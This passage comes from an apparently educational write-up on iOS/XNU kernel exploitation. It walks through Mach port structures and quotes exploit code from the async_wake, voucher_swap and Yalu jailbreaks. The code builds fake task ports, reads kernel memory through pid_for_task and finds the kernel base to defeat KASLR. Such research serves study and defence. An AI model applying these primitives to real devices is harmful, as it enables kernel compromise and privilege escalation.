    <span class="mi">100</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_TIMER</span>				<span class="mi">8</span>
    <span class="mi">101</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_PAGING_REQUEST</span>		<span class="mi">9</span>
    <span class="mi">102</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MIG</span>				<span class="mi">10</span>
    <span class="mi">103</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MEMORY_OBJECT</span>		<span class="mi">11</span>
    <span class="mi">104</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_PAGER</span>			<span class="mi">12</span>
    <span class="mi">105</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_KERNEL</span>			<span class="mi">13</span>
    <span class="mi">106</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_XMM_REPLY</span>			<span class="mi">14</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UND_REPLY</span>			<span class="mi">15</span>
    <span class="mi">108</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_HOST_NOTIFY</span>		<span class="mi">16</span>
    <span class="mi">109</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_HOST_SECURITY</span>		<span class="mi">17</span>
    <span class="mi">110</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_LEDGER</span>				<span class="mi">18</span>
    <span class="mi">111</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_MASTER_DEVICE</span>		<span class="mi">19</span>
    <span class="mi">112</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_TASK_NAME</span>			<span class="mi">20</span>
    <span class="mi">113</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_SUBSYSTEM</span>			<span class="mi">21</span>
    <span class="mi">114</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IO_DONE_QUEUE</span>		<span class="mi">22</span>
    <span class="mi">115</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_SEMAPHORE</span>			<span class="mi">23</span>
    <span class="mi">116</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_LOCK_SET</span>			<span class="mi">24</span>
    <span class="mi">117</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_CLOCK</span>				<span class="mi">25</span>
    <span class="mi">118</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_CLOCK_CTRL</span>			<span class="mi">26</span>
    <span class="mi">119</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_IDENT</span>		<span class="mi">27</span>
    <span class="mi">120</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_NAMED_ENTRY</span>		<span class="mi">28</span>
    <span class="mi">121</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_CONNECT</span>		<span class="mi">29</span>
    <span class="mi">122</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_IOKIT_OBJECT</span>		<span class="mi">30</span>
    <span class="mi">123</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UPL</span>				<span class="mi">31</span>
    <span class="mi">124</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_MEM_OBJ_CONTROL</span>		<span class="mi">32</span>
    <span class="mi">125</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_AU_SESSIONPORT</span>		<span class="mi">33</span>
    <span class="mi">126</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_FILEPORT</span>			<span class="mi">34</span>
    <span class="mi">127</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_LABELH</span>			<span class="mi">35</span>
    <span class="mi">128</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_TASK_RESUME</span>		<span class="mi">36</span>
    <span class="mi">129</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_VOUCHER</span>			<span class="mi">37</span>
    <span class="mi">130</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_VOUCHER_ATTR_CONTROL</span>	<span class="mi">38</span>
    <span class="mi">131</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_WORK_INTERVAL</span>              <span class="mi">39</span>
    <span class="mi">132</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UX_HANDLER</span>                 <span class="mi">40</span>
    <span class="mi">133</span><span class="o">:</span> 
    <span class="mi">134</span><span class="o">:</span> <span class="cm">/*
    135:  * Add new entries here and adjust IKOT_UNKNOWN.
    136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.
    137:  */</span>
    <span class="mi">138</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">IKOT_UNKNOWN</span>                    <span class="mi">41</span>      <span class="cm">/* magic catchall       */</span>
    <span class="mi">139</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span>	<span class="n">IKOT_MAX_TYPE</span>	<span class="p">(</span><span class="n">IKOT_UNKNOWN</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>	<span class="cm">/* # of IKOT_ types	*/</span>
    <span class="mi">140</span><span class="o">:</span> 
    <span class="mi">141</span><span class="o">:</span> 
    <span class="mi">142</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">is_ipc_kobject</span><span class="p">(</span><span class="n">ikot</span><span class="p">)</span>	<span class="p">((</span><span class="n">ikot</span><span class="p">)</span> <span class="o">!=</span> <span class="n">IKOT_NONE</span><span class="p">)</span>
    <span class="mi">143</span><span class="o">:</span> </code></pre></figure>

<p>Setting the <strong>io_bits</strong> field of the ports would look as simple as this.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#define IO_BITS_ACTIVE 0x80000000
</span>    <span class="cp">#define	IKOT_TASK 2
</span>    <span class="cp">#define IKOT_CLOCK 25
</span>
    <span class="n">fakeport</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">=</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">|</span> <span class="n">IKOT_CLOCK</span><span class="p">;</span>
    <span class="n">secondfakeport</span><span class="o">-&gt;</span><span class="n">io_bits</span> <span class="o">=</span> <span class="n">IKOT_TASK</span><span class="o">|</span><span class="n">IO_BITS_ACTIVE</span><span class="p">;</span></code></pre></figure>

<p>The <strong>io_references</strong> field of the <strong>ipc_object</strong> would also need to be set to anything other than 0, just to make sure the object isn’t deallocated.</p>

<p>Coming back to the port structure, one of the other important fields is the <strong>struct ipc_space *receiver</strong> field which points to the <strong>ipc_space</strong> struct. The <strong>ipc_space</strong> structure for a task defines its IPC abilities. Each IPC capability is represented by an <strong>ipc_entry</strong> and put in a table, which is pointed to by the <strong>is_table</strong> field in the <strong>ipc_space</strong> struct. The port rights or capablities in the <strong>is_table</strong> are 16 bits and have a name which is actually an index onto the <strong>is_table</strong>. It is important to note that within the kernel, port rights (<strong>mach_port_t</strong>) are represented by passing a pointer to the appropriate port data structure (<strong>ipc_port_t</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_space</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">114</span><span class="o">:</span> 
    <span class="mi">115</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_space</span> <span class="p">{</span>
    <span class="mi">116</span><span class="o">:</span> 	<span class="n">lck_spin_t</span>	<span class="n">is_lock_data</span><span class="p">;</span>
    <span class="mi">117</span><span class="o">:</span> 	<span class="n">ipc_space_refs_t</span> <span class="n">is_bits</span><span class="p">;</span>	<span class="cm">/* holds refs, active, growing */</span>
    <span class="mi">118</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_table_size</span><span class="p">;</span>	<span class="cm">/* current size of table */</span>
    <span class="mi">119</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_table_free</span><span class="p">;</span>	<span class="cm">/* count of free elements */</span>
    <span class="mi">120</span><span class="o">:</span> 	<span class="n">ipc_entry_t</span> <span class="n">is_table</span><span class="p">;</span>		<span class="cm">/* an array of entries */</span>
    <span class="mi">121</span><span class="o">:</span> 	<span class="n">task_t</span> <span class="n">is_task</span><span class="p">;</span>                 <span class="cm">/* associated task */</span>
    <span class="mi">122</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_table_size</span> <span class="o">*</span><span class="n">is_table_next</span><span class="p">;</span> <span class="cm">/* info for larger table */</span>
    <span class="mi">123</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_low_mod</span><span class="p">;</span>	<span class="cm">/* lowest modified entry during growth */</span>
    <span class="mi">124</span><span class="o">:</span> 	<span class="n">ipc_entry_num_t</span> <span class="n">is_high_mod</span><span class="p">;</span>	<span class="cm">/* highest modified entry during growth */</span>
    <span class="mi">125</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">bool_gen</span> <span class="n">bool_gen</span><span class="p">;</span>       <span class="cm">/* state for boolean RNG */</span>
    <span class="mi">126</span><span class="o">:</span> 	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">is_entropy</span><span class="p">[</span><span class="n">IS_ENTROPY_CNT</span><span class="p">];</span> <span class="cm">/* pool of entropy taken from RNG */</span>
    <span class="mi">127</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">is_node_id</span><span class="p">;</span>			<span class="cm">/* HOST_LOCAL_NODE, or remote node if proxy space */</span>
    <span class="mi">128</span><span class="o">:</span> <span class="p">};</span>
    <span class="mi">129</span><span class="o">:</span> </code></pre></figure>

<p>The IPC space is a very important struct, and hence most exploits look for the kernel <strong>ipc_space</strong> in order to get a proper (yet fake) kernel task port. The trick has been to copy the <strong>ipc_space_kernel</strong> to a new memory and make your fake port’s <strong>receiver</strong> field point to it.</p>

<p>The <strong>kobject</strong> field points to different data structures depending on the <strong>kobject</strong> type set in the <strong>io_bits</strong> field. Hence if you are faking a task port, you need to point the <strong>kobject</strong> field to a <strong>struct task</strong>, and in case of a clock, a <strong>struct clock</strong>.</p>

<p>That’s it, so you need to fake the port until you make it :). Here is an example of creating a fake port from the async_wake exploit.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">uint8_t</span><span class="o">*</span> <span class="nf">build_message_payload</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">dangling_port_address</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">message_body_size</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">message_body_offset</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">vm_map</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">receiver</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="o">**</span> <span class="n">context_ptr</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">body</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">message_body_size</span><span class="p">);</span>
      <span class="n">memset</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">message_body_size</span><span class="p">);</span>

      <span class="kt">uint32_t</span> <span class="n">port_page_offset</span> <span class="o">=</span> <span class="n">dangling_port_address</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">;</span>

      <span class="c1">// structure required for the first fake port:</span>
      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">fake_port</span> <span class="o">=</span> <span class="n">body</span> <span class="o">+</span> <span class="p">(</span><span class="n">port_page_offset</span> <span class="o">-</span> <span class="n">message_body_offset</span><span class="p">);</span>

      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IO_BITS</span><span class="p">))</span> <span class="o">=</span> <span class="n">IO_BITS_ACTIVE</span> <span class="o">|</span> <span class="n">IKOT_TASK</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xf00d</span><span class="p">;</span> <span class="c1">// leak references</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xf00d</span><span class="p">;</span> <span class="c1">// leak srights</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER</span><span class="p">))</span> <span class="o">=</span> <span class="n">receiver</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x123456789abcdef</span><span class="p">;</span>

      <span class="o">*</span><span class="n">context_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">));</span>

      <span class="c1">// set the kobject pointer such that task-&gt;bsd_info reads from ip_context:</span>
      <span class="kt">int</span> <span class="n">fake_task_offset</span> <span class="o">=</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT</span><span class="p">)</span> <span class="o">-</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_BSD_INFO</span><span class="p">);</span>

      <span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">dangling_port_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_port</span><span class="o">+</span><span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT</span><span class="p">))</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>

      <span class="c1">// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task</span>
      <span class="c1">// pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">+</span> <span class="n">fake_task_offset</span> <span class="o">&lt;</span> <span class="n">body</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"the maths is wrong somewhere, fake task doesn't fit in message</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">fake_task</span> <span class="o">=</span> <span class="n">fake_port</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>

      <span class="c1">// set the ref_count field of the fake task:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_REF_COUNT</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0xd00d</span><span class="p">;</span> <span class="c1">// leak references</span>

      <span class="c1">// make sure the task is active</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_ACTIVE</span><span class="p">))</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

      <span class="c1">// set the vm_map of the fake task:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_VM_MAP</span><span class="p">))</span> <span class="o">=</span> <span class="n">vm_map</span><span class="p">;</span>

      <span class="c1">// set the task lock type of the fake task's lock:</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)(</span><span class="n">fake_task</span> <span class="o">+</span> <span class="n">koffset</span><span class="p">(</span><span class="n">KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x22</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">body</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>For more details, i highly recommend checking out the this talk from CanSecWest <a href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">here</a>.</p>

<h2 id="pid_for_task-arbitrary-read-technique">pid_for_task() arbitrary read technique</h2>

<p>As discussed earlier, the <strong>pid_for_task</strong> Mach Trap will give out the <strong>PID</strong> of the corresponding task. It looks up the <strong>bsd_info</strong> field in the task struct which points to the corresponding BSD <strong>proc</strong> struct in the kernel, and reads the <strong>p_pid</strong> value. Assuming the <strong>p_pid</strong> field is at an offset of 0x10, and let’s say the address you want to read is <strong>addr</strong>, you can create a fake port, which then links to a fake task such that the <strong>bsd_info</strong> field in the task is <strong>addr - 0x10</strong>.</p>

<p>The following code from the voucher_swap exploit tries to do just that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_read32
     *
     * Description:
     * 	Read a 32-bit value from kernel memory using our fake port.
     *
     * 	This primitive requires that we know the address of the pipe buffer containing our port.
     */</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage1_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Create our fake task. The task's proc's p_pid field overlaps with the address we want to</span>
    	<span class="c1">// read.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">pipe_buffer_address</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_task</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_task_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">ref_count</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">,</span>  <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_proc_address</span><span class="p">;</span>
    	<span class="c1">// Initialize the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="c1">// Write our buffer to kernel memory.</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>Just combine the method twice and you can now read 64 bits at a time.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_read64
     *
     * Description:
     * 	Read a 64-bit value from kernel memory using our stage 1 read primitive.
     */</span>
    <span class="k">static</span> <span class="kt">uint64_t</span>
    <span class="nf">stage1_read64</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="k">union</span> <span class="p">{</span>
    		<span class="kt">uint32_t</span> <span class="n">value32</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    		<span class="kt">uint64_t</span> <span class="n">value64</span><span class="p">;</span>
    	<span class="p">}</span> <span class="n">u</span><span class="p">;</span>
    	<span class="n">u</span><span class="p">.</span><span class="n">value32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">address</span><span class="p">);</span>
    	<span class="n">u</span><span class="p">.</span><span class="n">value32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">address</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">u</span><span class="p">.</span><span class="n">value64</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>It is important to note that the offsets keep changing with different versions of iOS and its even different for different devices. These offsets are found both by looking at the kernel source code and also by looking at the kernelcache file.</p>

<p>This technique is very powerful and allows you to scour the kernel memory 4 bytes at a time. Another very important use case for is function is to find the kernel slide. All they have to do is to start reading the kernel memory backwards four bytes at a time until you get to the magic value <strong>0xfeedfacf</strong>. This address will denote the base address of the kernel, subtract it from the start address on the kernelcache when opened with IDA or Hopper and you will get the kernel slide. The following code from the Yalu jailbreak does just that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">     <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int32_t</span> <span class="n">leaked</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="c1">// The offset from the start of "struct task" to "task-&gt;bsd_info" seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit</span>
            <span class="c1">// It'd be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing</span>
            <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">faketask</span> <span class="o">+</span> <span class="n">procoff</span><span class="p">)</span> <span class="o">=</span> <span class="n">leaked_ptr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
            <span class="c1">// This tries to read a value from "task-&gt;bsd_info-&gt;p_pid" which translates to "faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr"</span>
            <span class="n">pid_for_task</span><span class="p">(</span><span class="n">foundport</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leaked</span><span class="p">);</span>
            <span class="c1">// Is it 0xfeedfacf?</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">leaked</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">NSLog</span><span class="p">(</span><span class="err">@</span><span class="s">"found kernel text at %llx"</span><span class="p">,</span> <span class="n">leaked_ptr</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// Retreat one page and search again</span>
            <span class="n">leaked_ptr</span> <span class="o">-=</span> <span class="mh">0x4000</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="c1">// Found kernel base!</span>
    <span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">leaked_ptr</span><span class="p">;</span>
    <span class="p">.....................</span>
    <span class="p">.....................</span>
    <span class="c1">// Calculating KASLR slide</span>
    <span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">slide</span><span class="p">;</span>
    <span class="n">slide</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">-</span> <span class="mh">0xFFFFFFF007004000</span><span class="p">;</span></code></pre></figure>

<p>Once kernel base is obtained, you can find some important structures in the kernel memory, such as <strong>extern struct proclist allproc;</strong>, which can be found in the file <strong>/bsd/sys/proc_internal.h</strong>, since even though the kernel is slid because of <strong>KASLR</strong>, the structs are still at a fixed offset from the kernel base. As we can see from the kernel code, this struct contains a list of the prcesses. The symbol addresses can also be found using <strong>**jtool2</strong> –analyze** feature, which utilizes the unstripped kernelcache that Apple mistakenly pushed out as a facilitator.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">proc_internal</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">673</span><span class="o">:</span> <span class="k">extern</span> <span class="n">lck_attr_t</span> <span class="o">*</span> <span class="n">proc_lck_attr</span><span class="p">;</span>
    <span class="mi">674</span><span class="o">:</span> 
    <span class="mi">675</span><span class="o">:</span> <span class="n">LIST_HEAD</span><span class="p">(</span><span class="n">proclist</span><span class="p">,</span> <span class="n">proc</span><span class="p">);</span>
    <span class="mi">676</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proclist</span> <span class="n">allproc</span><span class="p">;</span>		<span class="cm">/* List of all processes. */</span>
    <span class="mi">677</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proclist</span> <span class="n">zombproc</span><span class="p">;</span>	<span class="cm">/* List of zombie processes. */</span>
    <span class="mi">678</span><span class="o">:</span> 
    <span class="mi">679</span><span class="o">:</span> <span class="k">extern</span> <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">initproc</span><span class="p">;</span>
    <span class="mi">680</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span>	<span class="nf">procinit</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
    <span class="mi">681</span><span class="o">:</span> <span class="k">extern</span> <span class="kt">void</span> <span class="nf">proc_lock</span><span class="p">(</span><span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="p">);</span>
